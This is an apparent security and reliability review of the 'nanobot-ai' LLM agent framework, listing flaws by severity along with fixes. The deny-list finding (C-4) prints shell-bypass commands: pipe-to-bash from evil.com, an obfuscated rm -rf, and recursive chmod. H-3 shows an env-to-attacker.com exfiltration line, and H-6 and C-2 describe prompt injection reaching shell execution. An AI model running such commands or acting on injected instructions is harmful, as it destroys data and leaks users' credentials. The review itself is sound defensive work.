# Production Readiness Review: `nanobot-ai`

**Verdict: NOT production-ready.** The codebase contains 3 critical runtime bugs, 7 critical security vulnerabilities, multiple data-loss risks, and zero CI/CD. Below is the complete findings report, organized by category and priority.

---

## 🔴 CRITICAL — Must Fix Before Any Deployment

### C-1 — `web_search` is completely broken at runtime
**`nanobot/agent/tools/web.py:83`**
```python
# WRONG — 'api_key' is undefined in this scope; NameError on every call
headers={"X-Subscription-Token": api_key}
# CORRECT
headers={"X-Subscription-Token": self.api_key}
```
The bare `api_key` name is never defined as a local variable. Every configured web search call raises `NameError`, which is swallowed and returned as an error string to the LLM.

---

### C-2 — Container runs as root
**`Dockerfile:34`** — No `USER` instruction exists. The entire Python/Node.js process and every LLM-triggered shell command executes as UID 0. Combined with the shell execution tool, a single prompt injection grants root-level code execution inside the container.

```dockerfile
# Add before ENTRYPOINT:
RUN groupadd -r nanobot && useradd -r -g nanobot -d /home/nanobot -m nanobot
USER nanobot
```

---

### C-3 — Empty `allowFrom` allows ALL senders by default
**`nanobot/channels/base.py:74`**
```python
if not allow_list:
    return True  # OPEN TO ALL SENDERS
```
Every channel config defaults to `allow_from: []`. Any Telegram user, WhatsApp number, Discord user, email sender, etc. can interact with the agent and trigger shell execution on a freshly deployed instance.

**Fix:** Default to deny-all; require explicit `allow_all: true` flag to open access.

---

### C-4 — Shell command deny-list has extensive bypass gaps
**`nanobot/agent/tools/shell.py:26–36`**

The regex deny-list misses:
- `sudo rm -rf /` (no `sudo` pattern)
- `rm -r -f /` (flags split across arguments)
- `curl https://evil.com/payload.sh | bash` (no pipe-to-shell pattern)
- `eval "$(base64 -d <<< 'cm0gLXJmIC8=')"` (eval obfuscation)
- `chmod -R 777 /` (recursive chmod not blocked)

`restrict_to_workspace` is disabled by default, making path restriction opt-in.

---

### C-5 — Non-atomic writes create data loss on crash

Three critical files are written non-atomically:

| File | Location |
|------|----------|
| Session JSONL | `session/manager.py:162–179` |
| `MEMORY.md` | `agent/memory.py:59` |
| `cron/jobs.json` | `cron/service.py:165` |

`open(path, "w")` truncates the file immediately. A crash mid-write produces an empty/partial file, silently destroying conversation history, agent memory, or all scheduled jobs.

**Fix for all three:** Write to `.tmp`, then `os.replace()` (atomic rename):
```python
tmp = path.with_suffix(".tmp")
with open(tmp, "w") as f:
    f.write(...)
os.replace(tmp, path)
```

---

### C-6 — Global processing lock serializes ALL sessions
**`nanobot/agent/loop.py:105, 279`**

`asyncio.Lock()` is shared across every channel, every user. Message from User A on Telegram blocks User B on Slack for the entire 40-iteration agent loop duration. A single slow `exec` tool call (60s timeout) can hold the lock for a full minute, freezing all other users.

**Fix:** Per-session lock map:
```python
self._session_locks: dict[str, asyncio.Lock] = {}
lock = self._session_locks.setdefault(msg.session_key, asyncio.Lock())
```

---

### C-7 — Concurrent memory consolidation corrupts `MEMORY.md`
**`nanobot/agent/memory.py:58–63`**

`MemoryStore` is global (shared workspace). Two simultaneous consolidation tasks each read `MEMORY.md`, each call the LLM, each call `write_long_term()`. The second write silently overwrites the first, losing one session's memory updates. No file lock or async lock is present.

---

### C-8 — `tests/` directory is in `.gitignore`
**`.gitignore:22`** — `tests/` is listed. Any new test files added after this rule was introduced would not be committed. This likely prevents the test suite from being reproducible on a clean clone.

**Fix:** Remove `tests/` from `.gitignore`.

---

## 🟠 HIGH — Fix Before Production Traffic

### Security

| ID | File | Issue |
|----|------|-------|
| H-1 | `tools/web.py:33–43` | **SSRF** — `_validate_url()` doesn't block private IPs (`169.254.169.254`, `10.x`, `127.x`). LLM can exfiltrate AWS metadata. |
| H-2 | `tools/filesystem.py:10–21` | **Path traversal** — `allowed_dir=None` (default) allows reading `/etc/shadow`, `~/.ssh/id_rsa`, anything. |
| H-3 | `providers/litellm_provider.py:58–80` | **API key leakage** — Keys are written to `os.environ`. `ExecTool` inherits `os.environ`, so `env \| curl attacker.com -d @-` exfiltrates all keys. |
| H-4 | `config/loader.py:45–59` | **Config file is world-readable** — `open(path, "w")` with default umask creates `0644`. All API keys, bot tokens, IMAP passwords are readable by all users on the machine. |
| H-5 | `channels/telegram.py:284–305` | **ACL bypass on `/start`** — `_on_start` and `_on_help` handlers are registered without calling `is_allowed()`. Any Telegram user can probe the bot. |
| H-6 | `agent/loop.py:406–412` | **Prompt injection** — User message content is injected directly into LLM context with zero sanitization. `web_fetch` can also carry indirect injection from web pages. |
| H-7 | `config/schema.py:262–263` | **Gateway binds to `0.0.0.0`** — Default exposes the port to all network interfaces with no authentication. |
| H-8 | `bridge/src/server.ts:50` | **Timing attack on bridge token** — `===` string comparison is non-constant-time. Use `crypto.timingSafeEqual()`. |
| H-9 | `channels/email.py:269–270` | **Email `From:` header is spoofable** — SMTP `From:` is user-controlled. Any sender can forge `From: trusted@company.com` to bypass `allowFrom`. |

### Reliability & Availability

| ID | File | Issue |
|----|------|-------|
| H-10 | `bus/queue.py:17–18` | **Unbounded queues** — No `maxsize`. Under load the inbound queue grows without limit, consuming all memory. |
| H-11 | `agent/loop.py:186–192` | **No LLM call timeout** — A hung provider holds `_processing_lock` indefinitely, deadlocking the entire system. |
| H-12 | `channels/manager.py:147–163` | **No channel watchdog** — A channel that fails to start or crashes mid-run is silently done. No restart mechanism. |
| H-13 | `channels/discord.py:159–183` | **No `HEARTBEAT_ACK` handling** — The Discord gateway spec requires tracking opcode 11. Without it, zombie connections appear alive but deliver no events. |
| H-14 | `channels/discord.py:68–80` | **Duplicate heartbeat tasks on reconnect** — Old heartbeat task is never cancelled before reconnect, causing two concurrent tasks sending to the same WebSocket. |
| H-15 | `cron/service.py:230–233` | **`_arm_timer()` not called on save failure** — If `_save_store()` raises (e.g. disk full), `_arm_timer()` is never reached and the cron service silently stops. |
| H-16 | `cron/service.py:230–231` | **Serial cron job execution** — Due jobs run sequentially. A slow job blocks all others. Use `asyncio.gather()`. |
| H-17 | `heartbeat/service.py:137–138` | **No backoff on heartbeat failure** — Repeated exceptions cause an immediate CPU-spinning retry loop, flooding the LLM API. |
| H-18 | `agent/subagent.py:61–75` | **No subagent concurrency limit** — `spawn` tool allows unlimited concurrent subagents. Each runs up to 15 LLM calls. Can exhaust API rate limits and memory. |
| H-19 | `bridge/package.json:13` | **Baileys RC in production** — `@whiskeysockets/baileys@7.0.0-rc.9` is a release candidate. API stability and security fixes are not guaranteed. |

### Build & Infrastructure

| ID | File | Issue |
|----|------|-------|
| H-20 | `Dockerfile:30` | **No `package-lock.json` / `npm ci`** — `npm install` with no lockfile resolves different dependency trees on different build days. |
| H-21 | `bridge/package.json` | **No `npm audit` in build** — Known CVEs in Node.js dependencies go undetected. |
| H-22 | `config/loader.py:36` | **No backup before config migration** — A buggy migration permanently destroys user config with no recovery path. |
| H-23 | `cli/commands.py:291–292` | **`--verbose` enables stdlib logging but not Loguru** — `gateway --verbose` produces no nanobot logs at all. |
| H-24 | `agent/skills.py:217–226` | **Hand-rolled YAML parser is broken** — Fails on multi-line values, values containing colons, Windows line endings. Use `yaml.safe_load()`. |
| H-25 | (all) | **Zero CI/CD** — No automated test runs, no linting gate, no Docker build test, no `npm audit`, no secret scanning. |

---

## 🟡 MEDIUM — Fix Before Public Launch

### Architectural

| ID | File | Issue |
|----|------|-------|
| M-1 | `session/manager.py:83` | **Unbounded session cache** — All ever-seen sessions kept in RAM. No LRU/TTL eviction. |
| M-2 | `session/manager.py:142` | **Single corrupt JSONL line discards entire session** — Add per-line `try/except` with skip-and-warn. |
| M-3 | `agent/memory.py:145–146` | **`last_consolidated` races with `/new`** — Background consolidation mutates session state after `session.clear()`. |
| M-4 | `agent/loop.py:470–482` | **`process_direct` bypasses session lock** — Cron and heartbeat calls race with user messages on the same session. |
| M-5 | `cron/service.py:183–190` | **Restart overwrites persisted `next_run_at_ms`** — One-time jobs scheduled for the future are re-scheduled from restart time. |
| M-6 | `session/manager.py:158–160` | **Corrupt session silently replaced with empty** — Rename corrupt file to `.corrupt` and warn user instead. |
| M-7 | `providers/litellm_provider.py:224–232` | **All LLM exceptions return as text content** — `asyncio.CancelledError` must be re-raised; other errors should surface as recoverable failures. |
| M-8 | `providers/litellm_provider.py` | **No retry logic** — No retry on `429 RateLimitError`, `503`, or network timeouts. Use `tenacity`. |
| M-9 | `channels/manager.py:202–209` | **Outbound messages dropped without retry** — `channel.send()` failures are logged and the message is permanently lost. |
| M-10 | `agent/subagent.py:196–204` | **Subagent result injection races with session lock** — Subagent completions bypass per-session locking, interleaving turns. |
| M-11 | `agent/subagent.py` | **Subagents not cancelled on `AgentLoop.stop()`** — Running subagents outlive the gateway shutdown. |
| M-12 | `config/loader.py:38–41` | **Bad config silently falls back to default** — Parse failure resets `allow_from` to `[]` (open) and clears all tokens. Should be a fatal error. |

### Observability & Operations

| ID | File | Issue |
|----|------|-------|
| M-13 | `cli/commands.py:408–425` | **No HTTP health endpoint** — No `/health` probe for Docker healthcheck, Kubernetes, or uptime monitors. |
| M-14 | All channels | **No structured/JSON logging** — Loguru plain text is not suitable for log aggregators (Datadog, Loki, ELK). |
| M-15 | `channels/dingtalk.py:69`, `loop.py:340` | **Full message content logged at INFO** — PII and sensitive content appear in logs when debug is enabled. |
| M-16 | `docker-compose.yml:14` | **Port 18790 bound to all interfaces, no auth** — Exposes unauthenticated access to the bot from any network host. |
| M-17 | `docker-compose.yml:5` | **Secrets in plaintext bind-mounted file** — Use Docker Secrets or env-var injection. |
| M-18 | `pyproject.toml` | **No lockfile for Python deps** — No `uv.lock`; each `docker build` resolves different dependency versions. |
| M-19 | `config/loader.py:62` | **No schema version** — Migrations rely on key presence checks, not version numbers. Will break as migrations accumulate. |
| M-20 | `config/loader.py:58` | **Non-atomic config write** — Kill mid-write corrupts `config.json`. Use `os.replace()`. |
| M-21 | `.dockerignore` | **`tests/` not excluded from build context** — Test fixtures with hardcoded credentials could be copied into the image if `COPY . .` is ever added. |
| M-22 | `pyproject.toml:3` + `__init__.py:5` | **Version duplicated manually** — Use Hatch dynamic versioning to have a single source of truth. |
| M-23 | `pyproject.toml` | **No `pytest-cov`** — No test coverage measurement or enforcement gate. |

### Code Quality

| ID | File | Issue |
|----|------|-------|
| M-24 | `agent/context.py:114–120` | **Two consecutive `user` role messages** — Violates the alternating user/assistant convention; confuses strict providers. |
| M-25 | `channels/telegram.py:370–372` | **Media hardcoded to `~/.nanobot/media`** — Bypasses `restrict_to_workspace`; agent can access downloaded files outside workspace. |
| M-26 | `cli/commands.py:874–876` | **`--at` datetime parse error exposes Python traceback** — Wrap `fromisoformat()` in `try/except` with a clean error message. |
| M-27 | `channels/qq.py:57` | **In-memory dedup lost on restart** — QQ dedup set is not persisted; messages can be replayed after restart. |
| M-28 | `heartbeat/service.py:90` | **No timeout on heartbeat LLM call** — A hung provider stalls the heartbeat task permanently. |
| M-29 | `cron/service.py:41–43` | **Invalid cron expression silently creates broken job** — Validate with `croniter` at job creation time. |

---

## 🟢 LOW — Quality Improvements

| ID | File | Issue |
|----|------|-------|
| L-1 | `Dockerfile:1` | Base image not pinned by digest — mutable tags can change silently |
| L-2 | `Dockerfile:5` | `curl` and `git` not purged from final image — unnecessary attack surface |
| L-3 | `Dockerfile` | No `HEALTHCHECK` instruction |
| L-4 | `docker-compose.yml` | No log rotation limits — can fill disk on long-running containers |
| L-5 | `docker-compose.yml` | No explicit network isolation between services |
| L-6 | `config/loader.py:39–40` | `print()` used instead of `logger` for config errors |
| L-7 | `agent/loop.py:46` | `_TOOL_RESULT_MAX_CHARS = 500` is tiny and not configurable |
| L-8 | `agent/tools/shell.py:116` | `max_len = 10000` shell output cap is a hardcoded magic number |
| L-9 | `agent/skills.py:162–167` | `_strip_frontmatter` and `get_skill_metadata` regex don't agree on trailing newline |
| L-10 | `config/schema.py:208` | Default model is `claude-opus-4-5` (expensive); new users without Anthropic keys will get no useful default |
| L-11 | `config/schema.py:262` | `GatewayConfig.host`/`port` are defined but never read by the gateway command |
| L-12 | `providers/__init__.py` | `CustomProvider` and `ToolCallRequest` missing from `__all__` |
| L-13 | `cli/commands.py:1048` | `dict[str, callable]` — `callable` (lowercase) is not a valid type annotation |
| L-14 | Package root | No `py.typed` marker (PEP 561) |
| L-15 | `channels/telegram.py:51` | Link URL regex injects `href` value unsanitized — could produce `<a href="...">` with `tg://` deep-links |
| L-16 | `channels/whatsapp.py:46–47` | Bridge token transmitted plaintext over `ws://localhost` |
| L-17 | `utils/helpers.py:57–63` | `safe_filename()` doesn't handle Windows reserved names or 255-byte UTF-8 limit |
| L-18 | `channels/discord.py` | No `HEARTBEAT_ACK` tracking — zombie connections silently stop receiving events |
| L-19 | `.gitignore:19` | `poetry.lock` listed but project uses `uv`; `uv.lock` should be committed |
| L-20 | `bridge/package.json` | `ws` package pinned with `^` caret — had a CVE at `<8.17.1` |

---

## Test Coverage Gaps

The test suite is notably absent for the highest-risk components:

| Area | Tests | Risk |
|------|-------|------|
| `ExecTool` deny-list | ❌ None | The primary security control has zero test coverage |
| `FileSystemTool` path traversal | ❌ None | `restrict_to_workspace` enforcement is untested |
| Config loader / migration | ❌ None | Non-atomic write and migration bugs go undetected |
| Telegram / Discord / WhatsApp channels | ❌ None | All `allowFrom` enforcement and reconnect logic untested |
| `WebSearchTool` / `WebFetchTool` | ❌ None | The NameError bug (C-1) would have been caught by a single test |
| Email channel | ✅ 7 scenarios | Good |
| Matrix channel | ✅ 25+ scenarios | Excellent |
| Tool parameter validation | ✅ Good | Good |

---

## Prioritized Fix Order

**Immediate (pre-deployment blockers):**
1. `C-1` — Fix `api_key` → `self.api_key` (1-line fix)
2. `C-3` — Change `allowFrom: []` default to deny-all
3. `H-4` — Write `config.json` with `0600` permissions at creation time
4. `C-5` — Add atomic write (write-then-rename) for sessions, memory, and cron store
5. `C-8` — Remove `tests/` from `.gitignore`
6. `C-2` — Add non-root `USER` instruction to Dockerfile

**Before production traffic:**
7. `C-6` — Per-session processing locks
8. `C-7` — Workspace-level async lock for MEMORY.md
9. `H-1` — Block private IP ranges in `web_fetch`
10. `H-2` — Enable `restrict_to_workspace=True` by default
11. `H-3` — Remove API keys from `os.environ`; pass per-call only
12. `H-11` — Add LLM call timeouts with `asyncio.wait_for()`
13. `H-20` — Commit `package-lock.json`, use `npm ci`
14. `H-25` — Add minimal GitHub Actions CI (lint + test + Docker build)

**Before public launch:**
15. `M-13` — HTTP health endpoint
16. `M-7/M-8` — LLM error handling and retry with exponential backoff
17. `H-16` — Cron jobs run concurrently, not serially
18. `H-12` — Channel watchdog for auto-restart
19. `H-13/H-14` — Discord `HEARTBEAT_ACK` handling
20. `M-18` — Commit `uv.lock`, use `uv sync --frozen` in Dockerfile
